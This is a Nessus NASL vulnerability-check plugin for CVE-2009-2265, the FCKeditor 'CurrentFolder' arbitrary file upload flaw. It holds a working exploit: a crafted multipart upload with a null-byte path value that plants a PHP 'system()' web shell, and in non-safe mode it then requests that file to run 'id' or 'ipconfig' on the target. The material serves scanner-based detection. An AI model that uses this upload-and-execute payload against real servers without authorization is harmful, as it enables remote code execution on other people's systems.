#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(39806);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2016/12/08 20:11:35 $");

  script_cve_id("CVE-2009-2265");
  script_bugtraq_id(31812);
  script_osvdb_id(49431, 55684);
  script_xref(name:"Secunia", value:"35747");

  script_name(english:"FCKeditor 'CurrentFolder' Arbitrary File Upload");
  script_summary(english:"Tries to upload a php file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an arbitrary file upload vulnerability." );

  script_set_attribute(attribute:"description", value:
"FCKeditor is installed on the remote host.  It is an open source HTML
text editor that is typically bundled with web applications such
Dokeos, GForge, Geeklog, and Xoops, although it can also be installed
on its own. 

The installed version of the software fails to sanitize input passed
to the 'CurrentFolder' parameter of the 'upload.php' script located
under 'editor/filemanager/connectors/php'.  Provided PHP's
'magic_quotes_gpc' setting is disabled, an attacker may be able to
leverage this issue to upload arbitrary files and execute commands on
the remote system." );

  script_set_attribute(attribute:"see_also", value:"http://www.ocert.org/advisories/ocert-2009-007.html" );
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/archive/1/504721/100/0/threaded" );

  script_set_attribute(attribute:"solution", value:
"Upgrade to FCKeditor 2.6.4.1 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'ColdFusion 8.0.1 Arbitrary File Upload and Execute');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/07/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/07/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/07/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

os = get_kb_item("Host/OS");
if(os && "Windows" >< os)
{ 
 cmd = "'cmd /c ipconfig /all'";
 patmatch = "Windows IP Configuration";
} 
else
{
 cmd = "id";
 patmatch = "uid=[0-9]+.*gid=[0-9]+.*";
}

# Loop through various directories.
# /extension/fckeditor/fckeditor - knowledgeroot
# /lists/admin/FCKeditor - PHPlist
# /main/inc/lib/fckeditor - Dokeos

if (thorough_tests) dirs = list_uniq(make_list("/fckeditor", 
                             "/extension/fckeditor/fckeditor", 
                             "/lists/admin/FCKeditor", 
                             "/main/inc/lib/fckeditor", 
		             "/xampp",
                             cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (list_uniq(dirs))
{  
  dir = string(dir, "/editor/filemanager/connectors/php");

  folder_name = str_replace(
    find:".nasl", 
    replace:"-"+unixtime()+".php", 
    string:SCRIPT_NAME
  );

  if (safe_checks())
  {
    url = string(
      dir, "/upload.php?",
      "Command=FileUpload&",
      "Type=File&",
      "CurrentFolder=/", folder_name, "%2e"
    );

    res = http_send_recv3(port:port, method:"GET", item:url);
    if (isnull(res)) exit(0);

    # If it does and is not disabled...
    if (
      "OnUploadCompleted" >< res[2] && 
      "file uploader is disabled" >!< res[2]
    )
    {
      # Try to generate an error message while uploading a file.
      bound = "nessus";
      boundary = string("--", bound);

      postdata = string(
        boundary, "\r\n", 
        # nb: the filename specified here is irrelevant.
        'Content-Disposition: form-data; name="NewFile"; filename=nessus1.txt','\r\n',
        "Content-Type: application/zip \r\n",
        "\r\n",
        '<?php system(', cmd, ");  ?>\r\n",

        boundary, "--", "\r\n"
      );

       req = http_mk_post_req(
        port        : port,
        version     : 11, 
        item        : url, 
        add_headers : make_array(
                        "Content-Type", "multipart/form-data; boundary="+bound
        ),
        data        : postdata
      );

      res = http_send_recv_req(port:port, req:req);
      if (isnull(res)) exit(0);
      
      if (
        egrep(pattern:"OnUploadCompleted *\( *0",string:res[2]) &&
        string(folder_name, ".") >< res[2]
      )
      {
        report = string(
          "\n",
          "The remote FCKeditor install responded with the following error, while trying to upload a file : ",
          "\n\n",
          res[2],"\n\n",
          "Note that Nessus reported this issue only based on the error message because \n",
          "safe checks were enabled for this scan.\n"
        );
        security_hole(port:port, extra:report);
  
        exit(0);
      }
    }
  }
  else
  {
    url = string(
      dir, "/upload.php?",
      "Command=FileUpload&",
      "Type=File&",
      "CurrentFolder=/", folder_name, "%00"
    );
 
    res = http_send_recv3(port:port, method:"GET", item:url);
    if (isnull(res)) exit(0);

    # If it does and is not disabled...
    if (
      "OnUploadCompleted" >< res[2] && 
      "file uploader is disabled" >!< res[2]
    )
    {
      # Try to upload a file to run a command.
      bound = "nessus";
      boundary = string("--", bound);

      postdata = string(
      boundary, "\r\n", 
      # nb: the filename specified here is irrelevant.
      'Content-Disposition: form-data; name="NewFile"; filename=nessus1.txt','\r\n',
      "Content-Type: application/zip \r\n",
      "\r\n",
      '<?php system(', cmd, ");  ?>\r\n",

      boundary, "--", "\r\n"
      );

      req = http_mk_post_req(
        port        : port,
        version     : 11, 
        item        : url, 
        add_headers : make_array(
                        "Content-Type", "multipart/form-data; boundary="+bound
        ),
        data        : postdata
      );

      res = http_send_recv_req(port:port, req:req);
      if (isnull(res)) exit(0);
 
      pat = string('OnUploadCompleted\\( *0, *"([^"]+/', folder_name, ')');
      url2 = NULL;
      matches = egrep(pattern:pat, string:res[2]);
      if (matches)
      {
        foreach match (split(matches, keep:FALSE))
        {
          item = eregmatch(pattern:pat, string:match);
          if (!isnull(item))
          {
            url2 = item[1];
            break;
          }
        }
      }
      if (isnull(url2)) exit(0);

      # Now try to execute the script.
      res = http_send_recv3(port:port, method:"GET", item:url2);
      if (isnull(res)) exit(0);

      if( egrep(pattern:patmatch, string:res[2]))
      { 
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote host,\n",
          "which produced the following output :\n",
          "\n",
          res[2]
        );
        security_hole(port:port, extra:report);
        exit(0);
      }
    }
  }
}
